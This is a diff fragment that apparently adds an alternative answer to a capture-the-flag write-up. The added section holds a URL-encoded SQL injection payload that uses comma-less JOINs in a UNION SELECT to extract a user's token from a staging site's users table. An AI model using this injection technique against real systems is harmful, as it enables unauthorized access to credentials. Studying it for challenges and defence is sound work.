@@ -103,3 +103,9 @@ print('DONE')
 ```
 
 </details>
+
+<details>
+  <summary>Alternative (better) Answer</summary>
+  Use comma-less JOINs for arbitrary data SELECTs.
+  https://staging.jackfrosttower.com/detail/1,1%20union%20select%20*%20from%20((select%201)A%20join%20(select%20token%20from%20users%20where%20id%20=1)B%20join%20(select%20%22%22)C%20join%20(select%20%22%22)D%20join%20(select%20%22%22)E%20join%20(select%20%22%22)F%20join%20(select%20%22%22)G)--
+</details>
